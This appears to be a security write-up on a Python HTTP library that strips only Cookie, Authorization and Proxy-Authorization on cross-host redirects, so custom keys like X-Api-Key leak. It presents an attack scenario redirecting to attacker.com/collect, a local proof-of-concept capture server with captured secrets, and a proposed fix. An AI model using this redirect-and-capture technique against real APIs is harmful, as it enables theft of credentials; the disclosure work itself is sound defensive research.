---
title: "Custom Auth Headers Leaked on Redirect"
date: 2026-03-12 00:00:00 +0300
categories: [write-up, source-code-analysis]
tags: [python, http-redirect, credential-leakage, header-stripping, mitm, source-code-analysis]
---

Reading source code often goes like this: you're browsing through a library, everything looks fine, you're about to close the tab — then one line catches your eye. "Why isn't that header in this list?" And that question is where this write-up starts.

---

## Starting Point: A Frozenset in `retry.py`

While reading `retry.py`, lines 197–199 caught my attention:

```python
#: Default headers to be used for ``remove_headers_on_redirect``
DEFAULT_REMOVE_HEADERS_ON_REDIRECT = frozenset(
    ["Cookie", "Authorization", "Proxy-Authorization"]
    # X-Api-Key, X-Auth-Token, X-Access-Token are not present
)
```

The name is self-explanatory: a default list of headers to strip before following a redirect. A thoughtful security control.

But there are three things in that list. Just three. And all of them are RFC-defined.

---

## The Actual Mechanism: `poolmanager.py`

The code that uses this list lives in `poolmanager.py:477–487`:

```python
# Strip headers marked as unsafe to forward to the redirected location.
# Check remove_headers_on_redirect to avoid a potential network call within
# conn.is_same_host() which may use socket.gethostbyname() in the future.
if retries.remove_headers_on_redirect and not conn.is_same_host(
    redirect_location
):
    new_headers = kw["headers"].copy()
    for header in kw["headers"]:
        if header.lower() in retries.remove_headers_on_redirect:
            new_headers.pop(header, None)   # ← only strips what is listed
    kw["headers"] = new_headers
```

The logic is correct. Cross-host redirect is detected, `DEFAULT_REMOVE_HEADERS_ON_REDIRECT` is consulted, matching headers are removed.

The problem: it looks up the frozenset. That frozenset has no `X-Api-Key`. No `X-Auth-Token`. No `X-Access-Token`.

`Authorization` gets stripped because it's in the list. `X-Api-Key` gets forwarded because it isn't.

**The mechanism isn't broken — the default dataset is.**

---

## Attack Scenario

Let's think about this from an attacker's perspective.

The victim application sends a request to `api.service.com`:

```
GET /v1/data HTTP/1.1
Authorization: Bearer <token>     ← poolmanager.py will strip this
X-Api-Key: sk-prod-SECRET         ← poolmanager.py will forward this
X-Auth-Token: tok_live-ABC        ← poolmanager.py will forward this
```

The attacker has compromised `api.service.com` or is performing a MITM. The server responds:

```
HTTP/1.1 301 Moved Permanently
Location: http://attacker.com/collect
```

`poolmanager.py` detects the cross-host redirect and consults the frozenset in `retry.py`:

- `Authorization` → in the list → stripped ✓
- `X-Api-Key` → not in the list → forwarded ✗
- `X-Auth-Token` → not in the list → forwarded ✗

The attacker's server receives:

```
GET /collect HTTP/1.1
Host: attacker.com
X-Api-Key: sk-prod-SECRET
X-Auth-Token: tok_live-ABC
```

What does the victim application see? HTTP 200. No error. No warning. Nothing in the logs.

---

## PoC

**Environment**

```
Python   == 3.13.1
OS       == Windows 10
```

**Step 1 — Start the attacker capture server** (`attacker_server.py`):

```python
from http.server import HTTPServer, BaseHTTPRequestHandler

class Capture(BaseHTTPRequestHandler):
    def do_GET(self):
        print("\n[attacker server] received request:")
        for k, v in self.headers.items():
            print(f"  {k}: {v}")
        self.send_response(200)
        self.end_headers()
    def log_message(self, *_): pass

print("attacker server listening on port 8888...")
HTTPServer(("0.0.0.0", 8888), Capture).serve_forever()
```

```
python attacker_server.py
```

**Step 2 — Trigger the victim request** (`poc.py`):

```python
import threading, socketserver, http.server, time, ....

# Simulates a compromised upstream API server (api.service.com)
# that returns HTTP 301 → attacker-controlled destination
class CompromisedAPI(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(301)
        self.send_header("Location", "http://127.0.0.1:8888/collect")
        self.end_headers()
    def log_message(self, *_): pass

class Threaded(socketserver.ThreadingMixIn, socketserver.TCPServer):
    allow_reuse_address = True

srv = Threaded(("127.0.0.1", 9999), CompromisedAPI)
threading.Thread(target=srv.serve_forever, daemon=True).start()
time.sleep(0.1)

# Victim application — typical production pattern
PoolManager().request(
    "GET",
    "http://127.0.0.1:9999/v1/data",
    headers={
        "Authorization": "Bearer eyJhbGciOiJSUzI1NiJ9.TOKEN",
        "X-Api-Key":     "sk-prod-SECRET1234567890",
        "X-Auth-Token":  "tok_live_ABCDEF0987654321",
    },
    redirect=True,
    timeout=3.0,
)
print("request sent — check attacker_server.py terminal for captured headers")
```

```
python poc.py
```

**Attacker server output:**

```
attacker server listening on :8888

[attacker server] received request:
  Host: 127.0.0.1:8888
  X-Api-Key: sk-prod-SECRET1234567890
  X-Auth-Token: tok_live_ABCDEF0987654321
  Accept-Encoding: identity
```

`Authorization` is absent — `poolmanager.py` doing its job correctly. `X-Api-Key` and `X-Auth-Token` are present — because the list in `retry.py` is incomplete.

---

## Why This Isn't a "Configuration Gap"

The obvious counter-argument: "Users can extend the `remove_headers_on_redirect` list themselves."

Technically true. But the existence of `DEFAULT_REMOVE_HEADERS_ON_REDIRECT` signals that the library accepts responsibility for this attack surface. A developer who sees `Authorization` being stripped automatically has no reason to suspect `X-Api-Key` isn't — they'd need to read `retry.py` to find out.

`X-Api-Key` and `X-Auth-Token` are the de facto authentication standard across AWS, Stripe, OpenAI, GitHub, Twilio and the majority of REST APIs in production today. The fact that they're not in any RFC doesn't make them less sensitive.

---

## Fix

The frozenset in `retry.py:197` should be expanded:

```python
DEFAULT_REMOVE_HEADERS_ON_REDIRECT = frozenset([
    "Cookie",
    "Authorization",
    "Proxy-Authorization",
    "X-Api-Key",
    "X-Auth-Token",
    "X-Access-Token",
    "X-Secret-Key",
    "X-Auth",
    "X-Token",
    "X-Api-Secret",
])
```

---

## Things to Watch For When Auditing Source Code

This finding has a pattern worth keeping in mind for other projects:

**The security control exists but is incomplete.** The stripping logic in `poolmanager.py` is written correctly — the issue is the data in `retry.py`. When reviewing code, asking "when was this control written, and what threat model was it designed around?" is worth the time.

**Failure is silent.** Credential leakage via redirect leaves no trace. For any behavior like this, the question "how would you even know if something went wrong?" is critical.

**RFC scope ≠ real-world scope.** The list in `retry.py` was written against RFC definitions. But RFCs from the 2000s don't cover the API authentication patterns of 2026.

---

## References

- **OWASP — Information Exposure Through Query Strings**: General principles around credential exposure and leakage. [owasp.org](https://owasp.org/www-community/vulnerabilities/Information_exposure_through_query_strings_in_url)

- **Python Requests — Redirection and History**: Requests intentionally drops the `Authorization` header on cross-host redirects — the same behavior that `poolmanager.py` implements, and the same gap that applies to non-standard auth headers. [requests.readthedocs.io](https://requests.readthedocs.io/en/latest/user/quickstart/#redirection-and-history)

- **AWS API Gateway — API Key Source**: `X-Api-Key` is the standard authentication header in AWS API Gateway, illustrating that non-RFC headers are production-grade credentials, not edge cases. [docs.aws.amazon.com](https://docs.aws.amazon.com/apigateway/latest/developerguide/api-gateway-api-key-source.html)

---

Python `3.13.1` | March 2026
